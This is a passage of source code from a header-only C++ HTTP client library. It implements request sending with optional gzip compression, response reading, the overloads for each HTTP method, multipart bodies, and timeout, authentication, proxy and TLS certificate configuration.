    Request &amp;req, const char *body, size_t content_length,
    ContentProvider content_provider,
    ContentProviderWithoutLength content_provider_without_length,
    const std::string &amp;content_type, Error &amp;error) {
  if (!content_type.empty()) { req.set_header("Content-Type", content_type); }

#ifdef CPPHTTPLIB_ZLIB_SUPPORT
  if (compress_) { req.set_header("Content-Encoding", "gzip"); }
#endif

#ifdef CPPHTTPLIB_ZLIB_SUPPORT
  if (compress_ &amp;&amp; !content_provider_without_length) {
    // TODO: Brotli support
    detail::gzip_compressor compressor;

    if (content_provider) {
      auto ok = true;
      size_t offset = 0;
      DataSink data_sink;

      data_sink.write = [&amp;](const char *data, size_t data_len) -&gt; bool {
        if (ok) {
          auto last = offset + data_len == content_length;

          auto ret = compressor.compress(
              data, data_len, last,
              [&amp;](const char *compressed_data, size_t compressed_data_len) {
                req.body.append(compressed_data, compressed_data_len);
                return true;
              });

          if (ret) {
            offset += data_len;
          } else {
            ok = false;
          }
        }
        return ok;
      };

      while (ok &amp;&amp; offset &lt; content_length) {
        if (!content_provider(offset, content_length - offset, data_sink)) {
          error = Error::Canceled;
          return nullptr;
        }
      }
    } else {
      if (!compressor.compress(body, content_length, true,
                               [&amp;](const char *data, size_t data_len) {
                                 req.body.append(data, data_len);
                                 return true;
                               })) {
        error = Error::Compression;
        return nullptr;
      }
    }
  } else
#endif
  {
    if (content_provider) {
      req.content_length_ = content_length;
      req.content_provider_ = std::move(content_provider);
      req.is_chunked_content_provider_ = false;
    } else if (content_provider_without_length) {
      req.content_length_ = 0;
      req.content_provider_ = detail::ContentProviderAdapter(
          std::move(content_provider_without_length));
      req.is_chunked_content_provider_ = true;
      req.set_header("Transfer-Encoding", "chunked");
    } else {
      req.body.assign(body, content_length);
    }
  }

  auto res = detail::make_unique&lt;Response&gt;();
  return send(req, *res, error) ? std::move(res) : nullptr;
}

inline Result ClientImpl::send_with_content_provider(
    const std::string &amp;method, const std::string &amp;path, const Headers &amp;headers,
    const char *body, size_t content_length, ContentProvider content_provider,
    ContentProviderWithoutLength content_provider_without_length,
    const std::string &amp;content_type, Progress progress) {
  Request req;
  req.method = method;
  req.headers = headers;
  req.path = path;
  req.progress = progress;
  if (max_timeout_msec_ &gt; 0) {
    req.start_time_ = std::chrono::steady_clock::now();
  }

  auto error = Error::Success;

  auto res = send_with_content_provider(
      req, body, content_length, std::move(content_provider),
      std::move(content_provider_without_length), content_type, error);

  return Result{std::move(res), error, std::move(req.headers)};
}

inline std::string
ClientImpl::adjust_host_string(const std::string &amp;host) const {
  if (host.find(':') != std::string::npos) { return "[" + host + "]"; }
  return host;
}

inline bool ClientImpl::process_request(Stream &amp;strm, Request &amp;req,
                                        Response &amp;res, bool close_connection,
                                        Error &amp;error) {
  // Send request
  if (!write_request(strm, req, close_connection, error)) { return false; }

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
  if (is_ssl()) {
    auto is_proxy_enabled = !proxy_host_.empty() &amp;&amp; proxy_port_ != -1;
    if (!is_proxy_enabled) {
      if (detail::is_ssl_peer_could_be_closed(socket_.ssl, socket_.sock)) {
        error = Error::SSLPeerCouldBeClosed_;
        return false;
      }
    }
  }
#endif

  // Receive response and headers
  if (!read_response_line(strm, req, res) ||
      !detail::read_headers(strm, res.headers)) {
    error = Error::Read;
    return false;
  }

  // Body
  if ((res.status != StatusCode::NoContent_204) &amp;&amp; req.method != "HEAD" &amp;&amp;
      req.method != "CONNECT") {
    auto redirect = 300 &lt; res.status &amp;&amp; res.status &lt; 400 &amp;&amp;
                    res.status != StatusCode::NotModified_304 &amp;&amp;
                    follow_location_;

    if (req.response_handler &amp;&amp; !redirect) {
      if (!req.response_handler(res)) {
        error = Error::Canceled;
        return false;
      }
    }

    auto out =
        req.content_receiver
            ? static_cast&lt;ContentReceiverWithProgress&gt;(
                  [&amp;](const char *buf, size_t n, uint64_t off, uint64_t len) {
                    if (redirect) { return true; }
                    auto ret = req.content_receiver(buf, n, off, len);
                    if (!ret) { error = Error::Canceled; }
                    return ret;
                  })
            : static_cast&lt;ContentReceiverWithProgress&gt;(
                  [&amp;](const char *buf, size_t n, uint64_t /*off*/,
                      uint64_t /*len*/) {
                    assert(res.body.size() + n &lt;= res.body.max_size());
                    res.body.append(buf, n);
                    return true;
                  });

    auto progress = [&amp;](uint64_t current, uint64_t total) {
      if (!req.progress || redirect) { return true; }
      auto ret = req.progress(current, total);
      if (!ret) { error = Error::Canceled; }
      return ret;
    };

    if (res.has_header("Content-Length")) {
      if (!req.content_receiver) {
        auto len = res.get_header_value_u64("Content-Length");
        if (len &gt; res.body.max_size()) {
          error = Error::Read;
          return false;
        }
        res.body.reserve(static_cast&lt;size_t&gt;(len));
      }
    }

    if (res.status != StatusCode::NotModified_304) {
      int dummy_status;
      if (!detail::read_content(strm, res, (std::numeric_limits&lt;size_t&gt;::max)(),
                                dummy_status, std::move(progress),
                                std::move(out), decompress_)) {
        if (error != Error::Canceled) { error = Error::Read; }
        return false;
      }
    }
  }

  // Log
  if (logger_) { logger_(req, res); }

  return true;
}

inline ContentProviderWithoutLength ClientImpl::get_multipart_content_provider(
    const std::string &amp;boundary, const MultipartFormDataItems &amp;items,
    const MultipartFormDataProviderItems &amp;provider_items) const {
  size_t cur_item = 0;
  size_t cur_start = 0;
  // cur_item and cur_start are copied to within the std::function and maintain
  // state between successive calls
  return [&amp;, cur_item, cur_start](size_t offset,
                                  DataSink &amp;sink) mutable -&gt; bool {
    if (!offset &amp;&amp; !items.empty()) {
      sink.os &lt;&lt; detail::serialize_multipart_formdata(items, boundary, false);
      return true;
    } else if (cur_item &lt; provider_items.size()) {
      if (!cur_start) {
        const auto &amp;begin = detail::serialize_multipart_formdata_item_begin(
            provider_items[cur_item], boundary);
        offset += begin.size();
        cur_start = offset;
        sink.os &lt;&lt; begin;
      }

      DataSink cur_sink;
      auto has_data = true;
      cur_sink.write = sink.write;
      cur_sink.done = [&amp;]() { has_data = false; };

      if (!provider_items[cur_item].provider(offset - cur_start, cur_sink)) {
        return false;
      }

      if (!has_data) {
        sink.os &lt;&lt; detail::serialize_multipart_formdata_item_end();
        cur_item++;
        cur_start = 0;
      }
      return true;
    } else {
      sink.os &lt;&lt; detail::serialize_multipart_formdata_finish(boundary);
      sink.done();
      return true;
    }
  };
}

inline bool ClientImpl::process_socket(
    const Socket &amp;socket,
    std::chrono::time_point&lt;std::chrono::steady_clock&gt; start_time,
    std::function&lt;bool(Stream &amp;strm)&gt; callback) {
  return detail::process_client_socket(
      socket.sock, read_timeout_sec_, read_timeout_usec_, write_timeout_sec_,
      write_timeout_usec_, max_timeout_msec_, start_time,
      std::move(callback));
}

inline bool ClientImpl::is_ssl() const { return false; }

inline Result ClientImpl::Get(const std::string &amp;path) {
  return Get(path, Headers(), Progress());
}

inline Result ClientImpl::Get(const std::string &amp;path, Progress progress) {
  return Get(path, Headers(), std::move(progress));
}

inline Result ClientImpl::Get(const std::string &amp;path, const Headers &amp;headers) {
  return Get(path, headers, Progress());
}

inline Result ClientImpl::Get(const std::string &amp;path, const Headers &amp;headers,
                              Progress progress) {
  Request req;
  req.method = "GET";
  req.path = path;
  req.headers = headers;
  req.progress = std::move(progress);
  if (max_timeout_msec_ &gt; 0) {
    req.start_time_ = std::chrono::steady_clock::now();
  }

  return send_(std::move(req));
}

inline Result ClientImpl::Get(const std::string &amp;path,
                              ContentReceiver content_receiver) {
  return Get(path, Headers(), nullptr, std::move(content_receiver), nullptr);
}

inline Result ClientImpl::Get(const std::string &amp;path,
                              ContentReceiver content_receiver,
                              Progress progress) {
  return Get(path, Headers(), nullptr, std::move(content_receiver),
             std::move(progress));
}

inline Result ClientImpl::Get(const std::string &amp;path, const Headers &amp;headers,
                              ContentReceiver content_receiver) {
  return Get(path, headers, nullptr, std::move(content_receiver), nullptr);
}

inline Result ClientImpl::Get(const std::string &amp;path, const Headers &amp;headers,
                              ContentReceiver content_receiver,
                              Progress progress) {
  return Get(path, headers, nullptr, std::move(content_receiver),
             std::move(progress));
}

inline Result ClientImpl::Get(const std::string &amp;path,
                              ResponseHandler response_handler,
                              ContentReceiver content_receiver) {
  return Get(path, Headers(), std::move(response_handler),
             std::move(content_receiver), nullptr);
}

inline Result ClientImpl::Get(const std::string &amp;path, const Headers &amp;headers,
                              ResponseHandler response_handler,
                              ContentReceiver content_receiver) {
  return Get(path, headers, std::move(response_handler),
             std::move(content_receiver), nullptr);
}

inline Result ClientImpl::Get(const std::string &amp;path,
                              ResponseHandler response_handler,
                              ContentReceiver content_receiver,
                              Progress progress) {
  return Get(path, Headers(), std::move(response_handler),
             std::move(content_receiver), std::move(progress));
}

inline Result ClientImpl::Get(const std::string &amp;path, const Headers &amp;headers,
                              ResponseHandler response_handler,
                              ContentReceiver content_receiver,
                              Progress progress) {
  Request req;
  req.method = "GET";
  req.path = path;
  req.headers = headers;
  req.response_handler = std::move(response_handler);
  req.content_receiver =
      [content_receiver](const char *data, size_t data_length,
                         uint64_t /*offset*/, uint64_t /*total_length*/) {
        return content_receiver(data, data_length);
      };
  req.progress = std::move(progress);
  if (max_timeout_msec_ &gt; 0) {
    req.start_time_ = std::chrono::steady_clock::now();
  }

  return send_(std::move(req));
}

inline Result ClientImpl::Get(const std::string &amp;path, const Params &amp;params,
                              const Headers &amp;headers, Progress progress) {
  if (params.empty()) { return Get(path, headers); }

  std::string path_with_query = append_query_params(path, params);
  return Get(path_with_query, headers, std::move(progress));
}

inline Result ClientImpl::Get(const std::string &amp;path, const Params &amp;params,
                              const Headers &amp;headers,
                              ContentReceiver content_receiver,
                              Progress progress) {
  return Get(path, params, headers, nullptr, std::move(content_receiver),
             std::move(progress));
}

inline Result ClientImpl::Get(const std::string &amp;path, const Params &amp;params,
                              const Headers &amp;headers,
                              ResponseHandler response_handler,
                              ContentReceiver content_receiver,
                              Progress progress) {
  if (params.empty()) {
    return Get(path, headers, std::move(response_handler),
               std::move(content_receiver), std::move(progress));
  }

  std::string path_with_query = append_query_params(path, params);
  return Get(path_with_query, headers, std::move(response_handler),
             std::move(content_receiver), std::move(progress));
}

inline Result ClientImpl::Head(const std::string &amp;path) {
  return Head(path, Headers());
}

inline Result ClientImpl::Head(const std::string &amp;path,
                               const Headers &amp;headers) {
  Request req;
  req.method = "HEAD";
  req.headers = headers;
  req.path = path;
  if (max_timeout_msec_ &gt; 0) {
    req.start_time_ = std::chrono::steady_clock::now();
  }

  return send_(std::move(req));
}

inline Result ClientImpl::Post(const std::string &amp;path) {
  return Post(path, std::string(), std::string());
}

inline Result ClientImpl::Post(const std::string &amp;path,
                               const Headers &amp;headers) {
  return Post(path, headers, nullptr, 0, std::string());
}

inline Result ClientImpl::Post(const std::string &amp;path, const char *body,
                               size_t content_length,
                               const std::string &amp;content_type) {
  return Post(path, Headers(), body, content_length, content_type, nullptr);
}

inline Result ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                               const char *body, size_t content_length,
                               const std::string &amp;content_type) {
  return send_with_content_provider("POST", path, headers, body, content_length,
                                    nullptr, nullptr, content_type, nullptr);
}

inline Result ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                               const char *body, size_t content_length,
                               const std::string &amp;content_type,
                               Progress progress) {
  return send_with_content_provider("POST", path, headers, body, content_length,
                                    nullptr, nullptr, content_type, progress);
}

inline Result ClientImpl::Post(const std::string &amp;path, const std::string &amp;body,
                               const std::string &amp;content_type) {
  return Post(path, Headers(), body, content_type);
}

inline Result ClientImpl::Post(const std::string &amp;path, const std::string &amp;body,
                               const std::string &amp;content_type,
                               Progress progress) {
  return Post(path, Headers(), body, content_type, progress);
}

inline Result ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                               const std::string &amp;body,
                               const std::string &amp;content_type) {
  return send_with_content_provider("POST", path, headers, body.data(),
                                    body.size(), nullptr, nullptr, content_type,
                                    nullptr);
}

inline Result ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                               const std::string &amp;body,
                               const std::string &amp;content_type,
                               Progress progress) {
  return send_with_content_provider("POST", path, headers, body.data(),
                                    body.size(), nullptr, nullptr, content_type,
                                    progress);
}

inline Result ClientImpl::Post(const std::string &amp;path, const Params &amp;params) {
  return Post(path, Headers(), params);
}

inline Result ClientImpl::Post(const std::string &amp;path, size_t content_length,
                               ContentProvider content_provider,
                               const std::string &amp;content_type) {
  return Post(path, Headers(), content_length, std::move(content_provider),
              content_type);
}

inline Result ClientImpl::Post(const std::string &amp;path,
                               ContentProviderWithoutLength content_provider,
                               const std::string &amp;content_type) {
  return Post(path, Headers(), std::move(content_provider), content_type);
}

inline Result ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                               size_t content_length,
                               ContentProvider content_provider,
                               const std::string &amp;content_type) {
  return send_with_content_provider("POST", path, headers, nullptr,
                                    content_length, std::move(content_provider),
                                    nullptr, content_type, nullptr);
}

inline Result ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                               ContentProviderWithoutLength content_provider,
                               const std::string &amp;content_type) {
  return send_with_content_provider("POST", path, headers, nullptr, 0, nullptr,
                                    std::move(content_provider), content_type,
                                    nullptr);
}

inline Result ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                               const Params &amp;params) {
  auto query = detail::params_to_query_str(params);
  return Post(path, headers, query, "application/x-www-form-urlencoded");
}

inline Result ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                               const Params &amp;params, Progress progress) {
  auto query = detail::params_to_query_str(params);
  return Post(path, headers, query, "application/x-www-form-urlencoded",
              progress);
}

inline Result ClientImpl::Post(const std::string &amp;path,
                               const MultipartFormDataItems &amp;items) {
  return Post(path, Headers(), items);
}

inline Result ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                               const MultipartFormDataItems &amp;items) {
  const auto &amp;boundary = detail::make_multipart_data_boundary();
  const auto &amp;content_type =
      detail::serialize_multipart_formdata_get_content_type(boundary);
  const auto &amp;body = detail::serialize_multipart_formdata(items, boundary);
  return Post(path, headers, body, content_type);
}

inline Result ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                               const MultipartFormDataItems &amp;items,
                               const std::string &amp;boundary) {
  if (!detail::is_multipart_boundary_chars_valid(boundary)) {
    return Result{nullptr, Error::UnsupportedMultipartBoundaryChars};
  }

  const auto &amp;content_type =
      detail::serialize_multipart_formdata_get_content_type(boundary);
  const auto &amp;body = detail::serialize_multipart_formdata(items, boundary);
  return Post(path, headers, body, content_type);
}

inline Result
ClientImpl::Post(const std::string &amp;path, const Headers &amp;headers,
                 const MultipartFormDataItems &amp;items,
                 const MultipartFormDataProviderItems &amp;provider_items) {
  const auto &amp;boundary = detail::make_multipart_data_boundary();
  const auto &amp;content_type =
      detail::serialize_multipart_formdata_get_content_type(boundary);
  return send_with_content_provider(
      "POST", path, headers, nullptr, 0, nullptr,
      get_multipart_content_provider(boundary, items, provider_items),
      content_type, nullptr);
}

inline Result ClientImpl::Put(const std::string &amp;path) {
  return Put(path, std::string(), std::string());
}

inline Result ClientImpl::Put(const std::string &amp;path, const char *body,
                              size_t content_length,
                              const std::string &amp;content_type) {
  return Put(path, Headers(), body, content_length, content_type);
}

inline Result ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                              const char *body, size_t content_length,
                              const std::string &amp;content_type) {
  return send_with_content_provider("PUT", path, headers, body, content_length,
                                    nullptr, nullptr, content_type, nullptr);
}

inline Result ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                              const char *body, size_t content_length,
                              const std::string &amp;content_type,
                              Progress progress) {
  return send_with_content_provider("PUT", path, headers, body, content_length,
                                    nullptr, nullptr, content_type, progress);
}

inline Result ClientImpl::Put(const std::string &amp;path, const std::string &amp;body,
                              const std::string &amp;content_type) {
  return Put(path, Headers(), body, content_type);
}

inline Result ClientImpl::Put(const std::string &amp;path, const std::string &amp;body,
                              const std::string &amp;content_type,
                              Progress progress) {
  return Put(path, Headers(), body, content_type, progress);
}

inline Result ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                              const std::string &amp;body,
                              const std::string &amp;content_type) {
  return send_with_content_provider("PUT", path, headers, body.data(),
                                    body.size(), nullptr, nullptr, content_type,
                                    nullptr);
}

inline Result ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                              const std::string &amp;body,
                              const std::string &amp;content_type,
                              Progress progress) {
  return send_with_content_provider("PUT", path, headers, body.data(),
                                    body.size(), nullptr, nullptr, content_type,
                                    progress);
}

inline Result ClientImpl::Put(const std::string &amp;path, size_t content_length,
                              ContentProvider content_provider,
                              const std::string &amp;content_type) {
  return Put(path, Headers(), content_length, std::move(content_provider),
             content_type);
}

inline Result ClientImpl::Put(const std::string &amp;path,
                              ContentProviderWithoutLength content_provider,
                              const std::string &amp;content_type) {
  return Put(path, Headers(), std::move(content_provider), content_type);
}

inline Result ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                              size_t content_length,
                              ContentProvider content_provider,
                              const std::string &amp;content_type) {
  return send_with_content_provider("PUT", path, headers, nullptr,
                                    content_length, std::move(content_provider),
                                    nullptr, content_type, nullptr);
}

inline Result ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                              ContentProviderWithoutLength content_provider,
                              const std::string &amp;content_type) {
  return send_with_content_provider("PUT", path, headers, nullptr, 0, nullptr,
                                    std::move(content_provider), content_type,
                                    nullptr);
}

inline Result ClientImpl::Put(const std::string &amp;path, const Params &amp;params) {
  return Put(path, Headers(), params);
}

inline Result ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                              const Params &amp;params) {
  auto query = detail::params_to_query_str(params);
  return Put(path, headers, query, "application/x-www-form-urlencoded");
}

inline Result ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                              const Params &amp;params, Progress progress) {
  auto query = detail::params_to_query_str(params);
  return Put(path, headers, query, "application/x-www-form-urlencoded",
             progress);
}

inline Result ClientImpl::Put(const std::string &amp;path,
                              const MultipartFormDataItems &amp;items) {
  return Put(path, Headers(), items);
}

inline Result ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                              const MultipartFormDataItems &amp;items) {
  const auto &amp;boundary = detail::make_multipart_data_boundary();
  const auto &amp;content_type =
      detail::serialize_multipart_formdata_get_content_type(boundary);
  const auto &amp;body = detail::serialize_multipart_formdata(items, boundary);
  return Put(path, headers, body, content_type);
}

inline Result ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                              const MultipartFormDataItems &amp;items,
                              const std::string &amp;boundary) {
  if (!detail::is_multipart_boundary_chars_valid(boundary)) {
    return Result{nullptr, Error::UnsupportedMultipartBoundaryChars};
  }

  const auto &amp;content_type =
      detail::serialize_multipart_formdata_get_content_type(boundary);
  const auto &amp;body = detail::serialize_multipart_formdata(items, boundary);
  return Put(path, headers, body, content_type);
}

inline Result
ClientImpl::Put(const std::string &amp;path, const Headers &amp;headers,
                const MultipartFormDataItems &amp;items,
                const MultipartFormDataProviderItems &amp;provider_items) {
  const auto &amp;boundary = detail::make_multipart_data_boundary();
  const auto &amp;content_type =
      detail::serialize_multipart_formdata_get_content_type(boundary);
  return send_with_content_provider(
      "PUT", path, headers, nullptr, 0, nullptr,
      get_multipart_content_provider(boundary, items, provider_items),
      content_type, nullptr);
}
inline Result ClientImpl::Patch(const std::string &amp;path) {
  return Patch(path, std::string(), std::string());
}

inline Result ClientImpl::Patch(const std::string &amp;path, const char *body,
                                size_t content_length,
                                const std::string &amp;content_type) {
  return Patch(path, Headers(), body, content_length, content_type);
}

inline Result ClientImpl::Patch(const std::string &amp;path, const char *body,
                                size_t content_length,
                                const std::string &amp;content_type,
                                Progress progress) {
  return Patch(path, Headers(), body, content_length, content_type, progress);
}

inline Result ClientImpl::Patch(const std::string &amp;path, const Headers &amp;headers,
                                const char *body, size_t content_length,
                                const std::string &amp;content_type) {
  return Patch(path, headers, body, content_length, content_type, nullptr);
}

inline Result ClientImpl::Patch(const std::string &amp;path, const Headers &amp;headers,
                                const char *body, size_t content_length,
                                const std::string &amp;content_type,
                                Progress progress) {
  return send_with_content_provider("PATCH", path, headers, body,
                                    content_length, nullptr, nullptr,
                                    content_type, progress);
}

inline Result ClientImpl::Patch(const std::string &amp;path,
                                const std::string &amp;body,
                                const std::string &amp;content_type) {
  return Patch(path, Headers(), body, content_type);
}

inline Result ClientImpl::Patch(const std::string &amp;path,
                                const std::string &amp;body,
                                const std::string &amp;content_type,
                                Progress progress) {
  return Patch(path, Headers(), body, content_type, progress);
}

inline Result ClientImpl::Patch(const std::string &amp;path, const Headers &amp;headers,
                                const std::string &amp;body,
                                const std::string &amp;content_type) {
  return Patch(path, headers, body, content_type, nullptr);
}

inline Result ClientImpl::Patch(const std::string &amp;path, const Headers &amp;headers,
                                const std::string &amp;body,
                                const std::string &amp;content_type,
                                Progress progress) {
  return send_with_content_provider("PATCH", path, headers, body.data(),
                                    body.size(), nullptr, nullptr, content_type,
                                    progress);
}

inline Result ClientImpl::Patch(const std::string &amp;path, size_t content_length,
                                ContentProvider content_provider,
                                const std::string &amp;content_type) {
  return Patch(path, Headers(), content_length, std::move(content_provider),
               content_type);
}

inline Result ClientImpl::Patch(const std::string &amp;path,
                                ContentProviderWithoutLength content_provider,
                                const std::string &amp;content_type) {
  return Patch(path, Headers(), std::move(content_provider), content_type);
}

inline Result ClientImpl::Patch(const std::string &amp;path, const Headers &amp;headers,
                                size_t content_length,
                                ContentProvider content_provider,
                                const std::string &amp;content_type) {
  return send_with_content_provider("PATCH", path, headers, nullptr,
                                    content_length, std::move(content_provider),
                                    nullptr, content_type, nullptr);
}

inline Result ClientImpl::Patch(const std::string &amp;path, const Headers &amp;headers,
                                ContentProviderWithoutLength content_provider,
                                const std::string &amp;content_type) {
  return send_with_content_provider("PATCH", path, headers, nullptr, 0, nullptr,
                                    std::move(content_provider), content_type,
                                    nullptr);
}

inline Result ClientImpl::Delete(const std::string &amp;path) {
  return Delete(path, Headers(), std::string(), std::string());
}

inline Result ClientImpl::Delete(const std::string &amp;path,
                                 const Headers &amp;headers) {
  return Delete(path, headers, std::string(), std::string());
}

inline Result ClientImpl::Delete(const std::string &amp;path, const char *body,
                                 size_t content_length,
                                 const std::string &amp;content_type) {
  return Delete(path, Headers(), body, content_length, content_type);
}

inline Result ClientImpl::Delete(const std::string &amp;path, const char *body,
                                 size_t content_length,
                                 const std::string &amp;content_type,
                                 Progress progress) {
  return Delete(path, Headers(), body, content_length, content_type, progress);
}

inline Result ClientImpl::Delete(const std::string &amp;path,
                                 const Headers &amp;headers, const char *body,
                                 size_t content_length,
                                 const std::string &amp;content_type) {
  return Delete(path, headers, body, content_length, content_type, nullptr);
}

inline Result ClientImpl::Delete(const std::string &amp;path,
                                 const Headers &amp;headers, const char *body,
                                 size_t content_length,
                                 const std::string &amp;content_type,
                                 Progress progress) {
  Request req;
  req.method = "DELETE";
  req.headers = headers;
  req.path = path;
  req.progress = progress;
  if (max_timeout_msec_ &gt; 0) {
    req.start_time_ = std::chrono::steady_clock::now();
  }

  if (!content_type.empty()) { req.set_header("Content-Type", content_type); }
  req.body.assign(body, content_length);

  return send_(std::move(req));
}

inline Result ClientImpl::Delete(const std::string &amp;path,
                                 const std::string &amp;body,
                                 const std::string &amp;content_type) {
  return Delete(path, Headers(), body.data(), body.size(), content_type);
}

inline Result ClientImpl::Delete(const std::string &amp;path,
                                 const std::string &amp;body,
                                 const std::string &amp;content_type,
                                 Progress progress) {
  return Delete(path, Headers(), body.data(), body.size(), content_type,
                progress);
}

inline Result ClientImpl::Delete(const std::string &amp;path,
                                 const Headers &amp;headers,
                                 const std::string &amp;body,
                                 const std::string &amp;content_type) {
  return Delete(path, headers, body.data(), body.size(), content_type);
}

inline Result ClientImpl::Delete(const std::string &amp;path,
                                 const Headers &amp;headers,
                                 const std::string &amp;body,
                                 const std::string &amp;content_type,
                                 Progress progress) {
  return Delete(path, headers, body.data(), body.size(), content_type,
                progress);
}

inline Result ClientImpl::Options(const std::string &amp;path) {
  return Options(path, Headers());
}

inline Result ClientImpl::Options(const std::string &amp;path,
                                  const Headers &amp;headers) {
  Request req;
  req.method = "OPTIONS";
  req.headers = headers;
  req.path = path;
  if (max_timeout_msec_ &gt; 0) {
    req.start_time_ = std::chrono::steady_clock::now();
  }

  return send_(std::move(req));
}

inline void ClientImpl::stop() {
  std::lock_guard&lt;std::mutex&gt; guard(socket_mutex_);

  // If there is anything ongoing right now, the ONLY thread-safe thing we can
  // do is to shutdown_socket, so that threads using this socket suddenly
  // discover they can't read/write any more and error out. Everything else
  // (closing the socket, shutting ssl down) is unsafe because these actions are
  // not thread-safe.
  if (socket_requests_in_flight_ &gt; 0) {
    shutdown_socket(socket_);

    // Aside from that, we set a flag for the socket to be closed when we're
    // done.
    socket_should_be_closed_when_request_is_done_ = true;
    return;
  }

  // Otherwise, still holding the mutex, we can shut everything down ourselves
  shutdown_ssl(socket_, true);
  shutdown_socket(socket_);
  close_socket(socket_);
}

inline std::string ClientImpl::host() const { return host_; }

inline int ClientImpl::port() const { return port_; }

inline size_t ClientImpl::is_socket_open() const {
  std::lock_guard&lt;std::mutex&gt; guard(socket_mutex_);
  return socket_.is_open();
}

inline socket_t ClientImpl::socket() const { return socket_.sock; }

inline void ClientImpl::set_connection_timeout(time_t sec, time_t usec) {
  connection_timeout_sec_ = sec;
  connection_timeout_usec_ = usec;
}

inline void ClientImpl::set_read_timeout(time_t sec, time_t usec) {
  read_timeout_sec_ = sec;
  read_timeout_usec_ = usec;
}

inline void ClientImpl::set_write_timeout(time_t sec, time_t usec) {
  write_timeout_sec_ = sec;
  write_timeout_usec_ = usec;
}

inline void ClientImpl::set_max_timeout(time_t msec) {
  max_timeout_msec_ = msec;
}

inline void ClientImpl::set_basic_auth(const std::string &amp;username,
                                       const std::string &amp;password) {
  basic_auth_username_ = username;
  basic_auth_password_ = password;
}

inline void ClientImpl::set_bearer_token_auth(const std::string &amp;token) {
  bearer_token_auth_token_ = token;
}

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
inline void ClientImpl::set_digest_auth(const std::string &amp;username,
                                        const std::string &amp;password) {
  digest_auth_username_ = username;
  digest_auth_password_ = password;
}
#endif

inline void ClientImpl::set_keep_alive(bool on) { keep_alive_ = on; }

inline void ClientImpl::set_follow_location(bool on) { follow_location_ = on; }

inline void ClientImpl::set_url_encode(bool on) { url_encode_ = on; }

inline void
ClientImpl::set_hostname_addr_map(std::map&lt;std::string, std::string&gt; addr_map) {
  addr_map_ = std::move(addr_map);
}

inline void ClientImpl::set_default_headers(Headers headers) {
  default_headers_ = std::move(headers);
}

inline void ClientImpl::set_header_writer(
    std::function&lt;ssize_t(Stream &amp;, Headers &amp;)&gt; const &amp;writer) {
  header_writer_ = writer;
}

inline void ClientImpl::set_address_family(int family) {
  address_family_ = family;
}

inline void ClientImpl::set_tcp_nodelay(bool on) { tcp_nodelay_ = on; }

inline void ClientImpl::set_ipv6_v6only(bool on) { ipv6_v6only_ = on; }

inline void ClientImpl::set_socket_options(SocketOptions socket_options) {
  socket_options_ = std::move(socket_options);
}

inline void ClientImpl::set_compress(bool on) { compress_ = on; }

inline void ClientImpl::set_decompress(bool on) { decompress_ = on; }

inline void ClientImpl::set_interface(const std::string &amp;intf) {
  interface_ = intf;
}

inline void ClientImpl::set_proxy(const std::string &amp;host, int port) {
  proxy_host_ = host;
  proxy_port_ = port;
}

inline void ClientImpl::set_proxy_basic_auth(const std::string &amp;username,
                                             const std::string &amp;password) {
  proxy_basic_auth_username_ = username;
  proxy_basic_auth_password_ = password;
}

inline void ClientImpl::set_proxy_bearer_token_auth(const std::string &amp;token) {
  proxy_bearer_token_auth_token_ = token;
}

#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
inline void ClientImpl::set_proxy_digest_auth(const std::string &amp;username,
                                              const std::string &amp;password) {
  proxy_digest_auth_username_ = username;
  proxy_digest_auth_password_ = password;
}

inline void ClientImpl::set_ca_cert_path(const std::string &amp;ca_cert_file_path,
                                         const std::string &amp;ca_cert_dir_path) {
  ca_cert_file_path_ = ca_cert_file_path;
  ca_cert_dir_path_ = ca_cert_dir_path;
}

inline void ClientImpl::set_ca_cert_store(X509_STORE *ca_cert_store) {
  if (ca_cert_store &amp;&amp; ca_cert_store != ca_cert_store_) {
    ca_cert_store_ = ca_cert_store;
  }
}

inline X509_STORE *ClientImpl::create_ca_cert_store(const char *ca_cert,
                                                    std::size_t size) const {
  auto mem = BIO_new_mem_buf(ca_cert, static_cast&lt;int&gt;(size));
  auto se = detail::scope_exit([&amp;] { BIO_free_all(mem); });
  if (!mem) { return nullptr; }

  auto inf = PEM_X509_INFO_read_bio(mem, nullptr, nullptr, nullptr);
  if (!inf) { return nullptr; }

  auto cts = X509_STORE_new();
  if (cts) {
    for (auto i = 0; i &lt; static_cast&lt;int&gt;(sk_X509_INFO_num(inf)); i++) {
      auto itmp = sk_X509_INFO_value(inf, i);
      if (!itmp) { continue; }

      if (itmp-&gt;x509) { X509_STORE_add_cert(cts, itmp-&gt;x509); }
      if (itmp-&gt;crl) { X509_STORE_add_crl(cts, itmp-&gt;crl); }
    }
  }

  sk_X509_INFO_pop_free(inf, X509_INFO_free);
  return cts;
}

inline void ClientImpl::enable_server_certificate_verification(bool enabled) {
  server_certificate_verification_ = enabled;
}

inline void ClientImpl::enable_server_hostname_verification(bool enabled) {
  server_hostname_verification_ = enabled;
}

inline void ClientImpl::set_server_certificate_verifier(
    std::function&lt;bool(SSL *ssl)&gt; verifier) {
  server_certificate_verifier_ = verifier;
}
#endif

inline void ClientImpl::set_logger(Logger logger) {
  logger_ = std::move(logger);
}

/*
 * SSL Implementation
 */
#ifdef CPPHTTPLIB_OPENSSL_SUPPORT
namespace detail {

template &lt;typename U, typename V&gt;
